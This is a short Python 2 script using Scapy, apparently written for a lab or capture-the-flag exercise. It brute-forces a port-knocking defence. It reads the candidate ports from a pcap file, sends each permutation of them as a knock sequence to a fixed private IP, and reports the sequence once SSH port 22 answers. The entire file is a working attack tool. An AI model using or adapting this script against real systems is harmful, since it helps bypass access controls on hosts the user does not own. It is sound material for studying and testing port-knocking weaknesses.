# Port Knocking Brutefore
# Author : tmr (Abdessamad TEMMAR)
# Change log level to suppress annoying IPv6 error
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
import itertools

def send_udp_packet(udp_ip,udp_port):
	udp_packet = IP(dst=udp_ip)/UDP(dport=udp_port)/"UDP KNOCK !"
	send(udp_packet,verbose=False)

def send_tcp_packet(tcp_ip,tcp_port):
        tcp_packet = IP(dst=tcp_ip)/TCP(dport=tcp_port)/"TCP KNOCK !"
        send(tcp_packet,verbose=False)

def knock(ip,proto_port):
	proto,port=proto_port.split(":")
	if proto == 'udp':
		print "\t[+] Sending udp packet to :"+str(port)
		send_udp_packet(ip,int(port))
	else:
		print "\t[+] Sending tcp packet to :"+str(port)
		send_tcp_packet(ip,int(port))

def is_open(ip,port):
	p = IP(dst=ip)/TCP(dport=port, flags='S')
        resp = sr1(p, timeout=1, verbose=False)
	if str(type(resp)) == "<type 'NoneType'>":
		return False
	elif resp.haslayer(TCP):
		if resp.getlayer(TCP).flags == 0x12:
			send_rst = sr(IP(dst=ip)/TCP(dport=port, flags='AR'), timeout=1, verbose=False)
			return True
                elif resp.getlayer(TCP).flags == 0x14:
			return False

def get_port_list(pcap_file):
	port_list=[]
	pkts=rdpcap(pcap_file)
	for pkt in pkts:
        	if pkt.haslayer(TCP):
                	port_list.append("tcp:"+str(pkt.getlayer(TCP).dport))
        	elif pkt.haslayer(UDP):
                	port_list.append("udp:"+str(pkt.getlayer(UDP).dport))
	return port_list


#send_udp_packet('192.168.121.129',12345)
#send_tcp_packet('192.168.121.129',23456)
#send_udp_packet('192.168.121.129',34567)

#if is_open('192.168.121.129',22):
#	print "Open Port !"

#get_port_list("knock.pcap")
#exit()

#port_list = ['udp:12345','tcp:23456',"udp:34567"]
port_list = get_port_list("knock.pcap")

for L in range(1, len(port_list)+1):
	for subset in itertools.permutations(port_list, L):
		print "[+] Trying sequence :"+str(subset)
		for port in subset:
			knock('192.168.121.129',port)
		if is_open('192.168.121.129',22):
			print "[!] Correct knock sequence founded :"+str(subset)
			exit()
